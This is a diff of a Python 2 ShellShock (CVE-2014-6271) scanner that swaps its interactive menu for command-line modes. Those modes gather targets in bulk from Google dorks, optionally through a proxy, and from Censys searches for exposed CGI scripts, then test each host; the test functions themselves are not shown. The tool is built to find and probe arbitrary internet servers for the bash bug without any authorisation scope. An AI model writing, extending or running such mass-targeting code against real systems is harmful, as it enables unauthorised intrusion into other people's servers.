@@ -4,6 +4,8 @@
 from termcolor import cprint
 import json, requests, os
 import google
+import argparse
+
 
 API_URL = "https://www.censys.io/api/v1"
 UID = ""
@@ -12,22 +14,47 @@ SECRET = ""
 pages = float('inf')
 page = 1
 
-def single():
-    url = raw_input('[+] - Input the URL to test: ')
+def arguments():
+    parser = argparse.ArgumentParser(description = banner())
+    parser.add_argument('-m', '--mode', action = 'store', dest = 'mode',required = True, help = 'Mode of search, use google, censys or single')
+    parser.add_argument('-d', '--dork', action = 'store', dest = 'dork', default='filetype:cgi', required = False, help = 'Set the google dork.')
+    parser.add_argument('-p', '--proxy', action = 'store', dest = 'proxy',required = False, help = 'Set proxy Server to Google search')
+    parser.add_argument('-u', '--url', action = 'store', dest = 'url', required = False, help= 'Set URL to test ShellShock Vulnerability')
+    args = parser.parse_args()
+    if args.mode.lower() == 'google':
+        dork = args.dork
+        proxy = args.proxy
+        search_google(dork,proxy)
+    elif args.mode.lower() == 'censys':
+        search(API_URL,UID,SECRET,page,pages)
+    elif args.mode.lower() == 'single':
+        url = args.url
+        if url is None:
+            parser.print_help()
+        else:
+            single(url)
+    else:
+        parser.print_help()
+
+def single(url):
     test_conn(url)
 
-def search_google():
-    dork = raw_input('[+] - Please input the dork: ')
+def search_google(dork,proxy):
     from google import search
-    for url in search(dork,ip='69.175.71.171',conn_type='http'):
-        test_conn(url)
-    print
+    if proxy is None:
+        for url in search(dork):
+            test_conn(url)
+        print
+    else:
+        for url in search(dork,ip=proxy,conn_type='http'):
+            test_conn(url)
+        print
     cprint('[+] - GAME OVER - [+]','red','on_yellow')
     cprint('[+] - PRESS ANY KEY - [+]','red','on_yellow')
     raw_input()
-    menu()
 
 def search(API_URL,UID,SECRET,page,pages):
+    check_conf()
     while page <= pages:
         query = {'query':'80.http.get.title:/cgi-bin/test.cgi','page':page}
         res = requests.post(API_URL + "/search/ipv4", auth=(UID, SECRET), json=query)
@@ -74,7 +101,6 @@ def test_vuln(status_code,host_connection,url):
 
 def check_conf():
     if UID == '' or SECRET == '':
-        clear()
         cprint('''
 ███████╗██████╗ ██████╗  ██████╗
 ██╔════╝██╔══██╗██╔══██╗██╔═══██╗
@@ -120,7 +146,7 @@ def banner():
                                          ▀         ▀                                                                  ▀
     ''','red')
     cprint('[+] - Author: Matheus Bernardes','red')
-    cprint('[+] - Nick: G4bler','red')
+    cprint('[+] - Nick: G4mbler','red')
     cprint('[+] - Vulnerability Description','red')
     cprint('''
 GNU Bash through 4.3 processes trailing strings after function definitions in
@@ -133,57 +159,7 @@ from Bash execution, aka "ShellShock." NOTE: the original fix for this issue was
 incorrect; CVE-2014-7169 has been assigned to cover the vulnerability that is
 still present after the incorrect fix.
     ''','red')
+def main():
+    arguments()
 
-def clear():
-    try:
-        os.system('clear')
-    except:
-        os.system('cls')
-
-def menu():
-    clear()
-    banner()
-    cprint('''
-  ▄▄▄▄███▄▄▄▄      ▄████████ ███▄▄▄▄   ███    █▄
-▄██▀▀▀███▀▀▀██▄   ███    ███ ███▀▀▀██▄ ███    ███
-███   ███   ███   ███    █▀  ███   ███ ███    ███
-███   ███   ███  ▄███▄▄▄     ███   ███ ███    ███
-███   ███   ███ ▀▀███▀▀▀     ███   ███ ███    ███
-███   ███   ███   ███    █▄  ███   ███ ███    ███
-███   ███   ███   ███    ███ ███   ███ ███    ███
- ▀█   ███   █▀    ██████████  ▀█   █▀  ████████▀
-    ''','green')
-    cprint('[1] - Hack The Planet','green')
-    cprint('[2] - Single URL test','green')
-    cprint('[0] - Exit','green')
-    print
-    print
-    option = raw_input('[+] - Chose a option[0-2]: ')
-    print
-    if option == '1':
-        print
-        cprint('[+] - Select a plataform - [+]')
-        cprint('[1] - Use Google as source','green')
-        cprint('[2] - Use Censys as source','green')
-        cprint('[0] - Back to main menu','green')
-        print
-        print
-        source_option = raw_input('[+] - Chose a option[0-2]: ')
-        if source_option == '1':
-            search_google()
-        elif source_option == '2':
-            check_conf()
-            search(API_URL,UID,SECRET,page,pages)
-        elif source_option == '0':
-            menu()
-        else:
-            menu()
-    elif option == '2':
-        single()
-    elif option == '0':
-        exit()
-    else:
-        print 'please input a valid option'
-        menu()
-
-menu()
+main()
